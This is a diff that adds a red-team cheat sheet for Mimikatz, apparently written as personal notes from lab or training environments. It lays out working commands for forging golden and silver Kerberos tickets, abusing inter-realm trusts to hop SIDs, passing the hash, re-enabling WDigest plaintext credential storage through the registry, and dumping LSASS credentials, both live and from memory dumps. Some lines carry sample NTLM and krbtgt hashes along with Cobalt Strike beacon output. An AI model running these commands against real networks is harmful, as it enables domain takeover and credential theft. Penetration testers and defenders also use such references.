@@ -1,0 +1,170 @@
+MIMIKATZ
+Inter-realm Trust Abuse
+
+mimikatz lsadump::trust /patch 
+
+mimikatz kerberos::golden /user:Administrator /domain:<child domain> /sid:<child domain sid> /sids:<parent domain Enterprise Admins SID> /rc4:<trust ticket RC4 hash> /service:krbtgt /target:<parent domain> /ticket:<ticket to save>
+
+.\asktgs.exe C:\Users\Public\ticket.kirbi CIFS/server.domain.local
+
+.\kirbikator.exe lsa .\CIFS.domain.kirbi
+
+ls \\mcorp-dc.moneycorp.local\c$
+
+
+
+Sid Hopping Template
+
+
+target domain: admin.offshore.com
+
+current (child) domain: dev.admin.offshore.com
+
+child domain sid:
+
+Command for SID Hopping Golden Ticket:
+
+mimikatz kerberos::golden /user:<any user> /domain:<child domain> /sid:<child domain sid> /sids:<sids of enterprise domains in parent> /krbtgt:<krbtgt hash of child> /ptt
+
+
+
+
+
+Mimikatz Golden Ticket
+
+mimikatz kerberos::golden /user:<username> /domain:<FQDN> /sid:<sid of parent or child domain> /krbtgt:<hash of krbtgt> /ptt 
+
+/user: This is the user you want to forge a ticket for
+/domain: this is the domain you want to forge a ticket for
+/sid: this is the domain's SID
+/krbtgt: this is the KRBTGT Hash
+
+Mimikatz Silver Ticket
+
+mimikatz kerberos::golden /sid:<sid of parent or child domain> /domain:<FQDN> /ptt /target:DC01 /service:cifs /rc4:<NTLM Hash> /user:<FakeUser>
+
+
+Mimikatz Silver Ticket Command Reference
+ 
+The Mimikatz command to create a golden or silver ticket is “kerberos::golden”
+ 
+•  /domain – the fully qualified domain name. In this example: “lab.adsecurity.org”.
+• /sid – the SID of the domain. In this example: “S-1-5-21-1473643419-774954089-2222329127”.
+• /user – username to impersonate
+• /groups (optional) – group RIDs the user is a member of (the first is the primary group)
+• default: 513,512,520,518,519 for the well-known Administrator’s groups (listed below).
+• /ticket (optional) – provide a path and name for saving the Golden Ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.
+• /ptt – as an alternate to /ticket – use this to immediately inject the forged ticket into memory for use.
+• /id (optional) – user RID. Mimikatz default is 500 (the default Administrator account RID).
+• /startoffset (optional) – the start offset when the ticket is available (generally set to –10 or 0 if this option is used). Mimikatz Default value is 0.
+• /endin (optional) – ticket lifetime. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 10 hours (600 minutes).
+• /renewmax (optional) – maximum ticket lifetime with renewal. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 7 days (10,080 minutes).
+
+Disable mimikatz patch via registry
+
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+
+Pass The Hash
+
+sekurlsa::pth /user:SQLDEVADMIN /domain:US.FUNCORP.LOCAL /ntlm:ce03434e2f83b99704a631ae56e2146e
+
+All About SIDs
+
+beacon> mimikatz sid::lookup /name:appsvc
+[*] Tasked beacon to run mimikatz's sid::lookup /name:appsvc command
+[+] host called home, sent: 961605 bytes
+[+] received output:
+Name  : appsvc
+Type  : User
+Domain: ELS-CHILD
+SID   : S-1-5-21-23589937-599888933-351157107-1109
+
+beacon> mimikatz sid::lookup /name:uatoperator
+[*] Tasked beacon to run mimikatz's sid::lookup /name:uatoperator command
+[+] host called home, sent: 961605 bytes
+[+] received output:
+Name  : uatoperator
+Type  : User
+Domain: ELS-CHILD
+SID   : S-1-5-21-23589937-599888933-351157107-1110
+
+beacon> mimikatz sid::lookup /sid:S-1-5-21-23589937-599888933-351157107-1118
+[*] Tasked beacon to run mimikatz's sid::lookup /sid:S-1-5-21-23589937-599888933-351157107-1118 command
+[+] host called home, sent: 961605 bytes
+[+] received output:
+SID   : S-1-5-21-23589937-599888933-351157107-1118
+Type  : Group
+Domain: ELS-CHILD
+Name  : PowerShell Remoting
+
+Golden Ticket
+
+kerberos::golden /user:arobbins_da /domain:citadel.covertius.local /sid:S-1-5-21-592301725-3004806419-1885942225 /krbtgt:c1c540cb1f997657f5465e08468725f3 /endin:480 /renewmax:10080 /ptt
+
+arobbins_da is the user
+sid is the domain sid of citadel.covertius.local
+citadel.covertius.local is the domain
+krbtgt is the ticket granting ticket found on the domain controller of through dcsync
+
+
+
+In Cobalt Strike Beacon or Mimikatz Command Prompt
+
+mimikatz sekurlsa::<enter something from below, e.g. msv>
+
+
+
+mimikatz sekurlsa::msv
+mimikatz sekurlsa::wdigest
+mimikatz sekurlsa::kerberos  <I've seen this pull plain text passwords>
+mimikatz sekurlsa::tspkg
+mimikatz sekurlsa::livessp
+mimikatz sekurlsa::ssp
+mimikatz sekurlsa::logonPasswords
+mimikatz sekurlsa::minidump
+mimikatz sekurlsa::trust
+mimikatz sekurlsa::backupkeys
+mimikatz sekurlsa::tickets
+mimikatz sekurlsa::ekeys
+mimikatz sekurlsa::dpapi
+mimikatz sekurlsa::credman
+mimikatz sekurlsa::
+mimikatz sekurlsa::msv  -  Lists LM & NTLM credentials
+         wdigest  -  Lists WDigest credentials
+        kerberos  -  Lists Kerberos credentials
+           tspkg  -  Lists TsPkg credentials
+         livessp  -  Lists LiveSSP credentials
+             ssp  -  Lists SSP credentials
+  logonPasswords  -  Lists all available providers credentials
+         process  -  Switch (or reinit) to LSASS process  context
+        minidump  -  Switch (or reinit) to LSASS minidump context
+             pth  -  Pass-the-hash
+          krbtgt  -  krbtgt!
+     dpapisystem  -  DPAPI_SYSTEM secret
+           trust  -  Antisocial
+      backupkeys  -  Preferred Backup Master keys
+         tickets  -  List Kerberos tickets
+           ekeys  -  List Kerberos Encryption Keys
+           dpapi  -  List Cached MasterKeys
+         credman  -  List Credentials Manager
+
+Dump Creds from .dmp file with mimikatz and volatility
+
+https://medium.com/@ali.bawazeeer/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330
+
+1. /usr/share/volatility
+2. mkdir plugins
+3. cd plugins
+4. wget https://raw.githubusercontent.com/dfirfpi/hotoloti/master/volatility/mimikatz.py
+5. apt-get install python-crypto
+6. volatility — plugins=/usr/share/volatility/plugins — profile=Win7SP0x86 -f halomar.dmp mimikatz
+
+Or, alternatively
+
+Run Mimikatz
+Type, “sekurlsa::Minidump lsassdump.dmp“
+Lastly type, “sekurlsa::logonPasswords“
+
+
+
+
